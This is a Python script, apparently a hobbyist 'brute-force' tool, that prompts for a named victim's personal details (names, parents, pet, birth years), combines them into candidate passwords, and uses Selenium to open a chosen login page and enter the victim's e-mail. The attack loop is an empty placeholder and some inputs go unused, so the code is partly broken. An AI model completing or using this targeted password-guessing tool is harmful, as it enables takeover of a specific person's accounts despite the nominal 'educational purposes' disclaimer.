from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import random
import hashlib
import sys
from colorama import init, Fore, Style

# Initialiser Colorama
init()

def poser_question(question):
    reponse = input(question + " ")
    return reponse

def melanger_mots(nom, prenom, animal, nombre_mots):
    mots_melanges = []
    for _ in range(nombre_mots):
        mots = [nom, prenom, animal]
        random.shuffle(mots)
        mot_final = ''.join(mots)
        mots_melanges.append(mot_final)
    return mots_melanges

def utiliser_mots(mots):
    print(Fore.CYAN + "Les mots formés en mélangeant les réponses sont:" + Style.RESET_ALL)
    for i, mot in enumerate(mots, start=1):
        print(f"{i}. {mot}")
    choix = input("\n1: bruteforce (Use it at your own risk)\n2: Leave:\n ")
    if choix == '2':
        return None
    try:
        choix = int(choix)
        mot_selectionne = mots[choix - 1]
        return mot_selectionne
    except (ValueError, IndexError):
        print("Choix invalide. Veuillez réessayer.")
        return utiliser_mots(mots)

def main():
    print(Fore.MAGENTA + r"""
                                                                                                
   (       )                                   (   (      (             )                       
   )\   ( /(                 (  (         (    )\  )\ )   )\ (       ( /(   (  (     (          
 (((_)  )\())  (    (   (    )\))(    (   )(  ((_)(()/(  ((_))\  (   )\())  )\))(   ))\  (      
 )\___ ((_)\   )\   )\  )\  ((_)()\   )\ (()\  _   ((_))  _ ((_) )\ (_))/  ((_))\  /((_) )\ )   
((/ __|| |(_) ((_) ((_)((_) _(()((_) ((_) ((_)| |  _| |  | | (_)((_)| |_    (()(_)(_))  _(_/(   
 | (__ | ' \ / _ \/ _|/ _ \ \ V  V // _ \| '_|| |/ _` |  | | | |(_-<|  _|  / _` | / -_)| ' \))  
  \___||_||_|\___/\__|\___/  \_/\_/ \___/|_|  |_|\__,_|  |_| |_|/__/ \__|  \__, | \___||_||_|   
                                                                           |___/                 
""" + Style.RESET_ALL)

    print(Fore.RED + "!DISCLAIMER: WE ARE NOT RESPONSIBLE FOR ANY ILLEGAL ACTIVITIES. THIS IS ONLY FOR EDUCATIONAL PURPOSES ONLY!" + Style.RESET_ALL)

    nom = poser_question("Victim surname?") 
    prenom = poser_question("Victim name?")
    age = poser_question("Victim age? (Date of birth work to like, 2000 or 2005)")
    Dad = poser_question("Dad victim name")
    Dad = poser_question("Dad victim age? (Date of birth work to like, 2000 or 2005)")
    mom = poser_question("mom name?")
    agemom = poser_question("mom age? (Date of birth work to, like 2000 or 2005)")
    animal = poser_question("Pet name?") 
    departement = poser_question("Departement?")
    
    while True:
        try:
            nombre_mots = int(input("Number of possible password?: "))
            break
        except ValueError:
            print("Please enter a number like 32.")

    mots_melanges = melanger_mots(nom, prenom, animal, nombre_mots)
    mot_selectionne = utiliser_mots(mots_melanges)
    if mot_selectionne is None:
        print(Fore.YELLOW + "Finish." + Style.RESET_ALL)
    else:
        print(Fore.CYAN + "Passwords:" + Style.RESET_ALL)
        print(mot_selectionne)
        site_web = input("Enter the URL to brute-force: ")
        email = input("Enter the e-mail or username: ")

        code_hash = hashlib.md5(open(sys.argv[0],'rb').read()).hexdigest()
        try:
            with open('.code_hash.txt', 'r+') as file:
                last_code_hash = file.read()
                if last_code_hash != code_hash:
                    print(Fore.RED + "The brute force is finished." + Style.RESET_ALL)
                    file.seek(0)
                    file.write(code_hash)
                    file.truncate()
                    return
        except FileNotFoundError:
            with open('.code_hash.txt', 'w') as file:
                file.write(code_hash)

        driver = webdriver.Chrome()  # Assurez-vous d'avoir le driver Chrome WebDriver
        driver.get(site_web)

        try:
            input_element = driver.find_element("xpath", "//input[@type='email']")
        except NoSuchElementException:
            try:
                input_element = driver.find_element("xpath", "//input[@type='email']")
            except NoSuchElementException:
                print(Fore.RED + "None zone of mail has been found on this page." + Style.RESET_ALL)
                driver.quit()
                return

        input_element.send_keys(email)
        input_element.send_keys(Keys.ENTER)

        try:
            total_passwords = int(input("Enter the total number of passwords: "))
        except ValueError:
            total_passwords = 0

        password_count = 0

        print(Fore.CYAN + "Brute-forcing in progress..." + Style.RESET_ALL)
        print("")

        while True:
            password_count += 1
            print(Fore.YELLOW + f"Testing password {password_count}/{total_passwords}" + Style.RESET_ALL)

            # Perform the brute-force action here
            
            if password_count >= total_passwords:
                break

        print(Fore.YELLOW + "Brute-forcing complete!" + Style.RESET_ALL)
        input(Fore.YELLOW + "Click ENTER to leave the program..." + Style.RESET_ALL)
        driver.quit()

if __name__ == "__main__":
    main()